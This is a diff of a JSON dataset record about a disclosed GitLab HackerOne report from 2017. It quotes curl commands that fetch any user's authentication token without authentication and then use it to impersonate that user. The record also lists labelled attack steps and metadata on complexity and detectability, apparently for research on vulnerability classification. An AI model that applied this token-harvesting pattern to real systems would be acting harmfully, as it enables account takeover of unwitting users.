@@ -1,48 +1,48 @@
 {
-    "reported_to": "GitLab",
-    "reported_by": "rpearl ",
-    "title": "all private tokens are leaked to an unauthenticated attacker",
-    "content": "\nUsing the api, one can obtain the authentication token for any user on gitlab:\nCode 104 Bytes\n1$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'\n2\"[redacted]\"\nWe can then use this token to impersonate any user to perform any action they can perform:\n$ curl --request POST --header \"PRIVATE-TOKEN: [redacted]\" https://gitlab.com/api/v4/projects/3831210/issues?title=owned\nCode 1014 Bytes\n1{\"id\":6843690,\"iid\":4,\"project_id\":3831210,\"title\":\"owned\",\"description\":\"\",\"state\":\"opened\",\"created_at\":\"2017-09-15T21:58:06.342Z\",\"updated_at\":\"2017-09-15T21:58:06.342Z\",\"labels\":[],\"milestone\":null,\"assignees\":[],\"author\":{\"id\":951422,\"name\":\"Andrew Drake\",\"username\":\"adrake\",\"state\":\"active\",\"avatar_url\":\"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon\",\"web_url\":\"https://gitlab.com/adrake\"},\"assignee\":null,\"user_notes_count\":0,\"upvotes\":0,\"downvotes\":0,\"due_date\":null,\"confidential\":false,\"weight\":null,\"web_url\":\"https://gitlab.com/karmiclabs/slabricator/issues/4\",\"time_stats\":{\"time_estimate\":0,\"total_time_spent\":0,\"human_time_estimate\":null,\"human_total_time_spent\":null},\"_links\":{\"self\":\"http://gitlab.com/api/v4/projects/3831210/issues/4\",\"notes\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/notes\",\"award_emoji\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji\",\"project\":\"http://gitlab.com/api/v4/projects/3831210\"},\"subscribed\":true}\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "GitLab",
+  "reported_by": "rpearl ",
+  "title": "all private tokens are leaked to an unauthenticated attacker",
+  "content": "\nUsing the api, one can obtain the authentication token for any user on gitlab:\nCode 104 Bytes\n1$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'\n2\"[redacted]\"\nWe can then use this token to impersonate any user to perform any action they can perform:\n$ curl --request POST --header \"PRIVATE-TOKEN: [redacted]\" https://gitlab.com/api/v4/projects/3831210/issues?title=owned\nCode 1014 Bytes\n1{\"id\":6843690,\"iid\":4,\"project_id\":3831210,\"title\":\"owned\",\"description\":\"\",\"state\":\"opened\",\"created_at\":\"2017-09-15T21:58:06.342Z\",\"updated_at\":\"2017-09-15T21:58:06.342Z\",\"labels\":[],\"milestone\":null,\"assignees\":[],\"author\":{\"id\":951422,\"name\":\"Andrew Drake\",\"username\":\"adrake\",\"state\":\"active\",\"avatar_url\":\"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon\",\"web_url\":\"https://gitlab.com/adrake\"},\"assignee\":null,\"user_notes_count\":0,\"upvotes\":0,\"downvotes\":0,\"due_date\":null,\"confidential\":false,\"weight\":null,\"web_url\":\"https://gitlab.com/karmiclabs/slabricator/issues/4\",\"time_stats\":{\"time_estimate\":0,\"total_time_spent\":0,\"human_time_estimate\":null,\"human_total_time_spent\":null},\"_links\":{\"self\":\"http://gitlab.com/api/v4/projects/3831210/issues/4\",\"notes\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/notes\",\"award_emoji\":\"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji\",\"project\":\"http://gitlab.com/api/v4/projects/3831210\"},\"subscribed\":true}\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Privilege Escalation"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1506016500,
+  "report_url": "https://hackerone.com/reports/268794",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Use the GitLab API to retrieve the authentication token for any user by sending a GET request to `https://gitlab.com/api/v4/users/{user_id}` and parsing the `authentication_token` field from the response."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Privilege Escalation"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1506016500,
-    "report_url": "https://hackerone.com/reports/268794",
-    "is_multi_component": false,
-    "complexity": "LOW",
-    "novelty": "LOW",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Use the GitLab API to retrieve the authentication token for any user by sending a GET request to `https://gitlab.com/api/v4/users/{user_id}` and parsing the `authentication_token` field from the response."
-        ],
-        [
-            2,
-            "Use the obtained token to impersonate the user by including it in the `PRIVATE-TOKEN` header of subsequent API requests, such as creating an issue in a project."
-        ]
-    ],
-    "vuln_description": "The vulnerability allows an unauthenticated attacker to retrieve the authentication tokens of any GitLab user via the API, enabling them to impersonate the user and perform any actions the user is authorized to do.",
-    "reason": "The attack is straightforward, involving only two simple steps: retrieving the token and using it. There are no complex interactions or states to manipulate, and the logic is not novel or non-obvious.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      2,
+      "Use the obtained token to impersonate the user by including it in the `PRIVATE-TOKEN` header of subsequent API requests, such as creating an issue in a project."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an unauthenticated attacker to retrieve the authentication tokens of any GitLab user via the API, enabling them to impersonate the user and perform any actions the user is authorized to do.",
+  "reason": "The attack is straightforward, involving only two simple steps: retrieving the token and using it. There are no complex interactions or states to manipulate, and the logic is not novel or non-obvious.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves accessing authentication tokens for any user via an unauthenticated API endpoint, which falls under the AuthN/AuthZ Bypass category. The methodology described includes testing actions with unauthenticated user sessions (step d), which would cover this case if the API endpoint was part of the logged requests during regular navigation.",
+    "is_detectable": true
+  }
 }
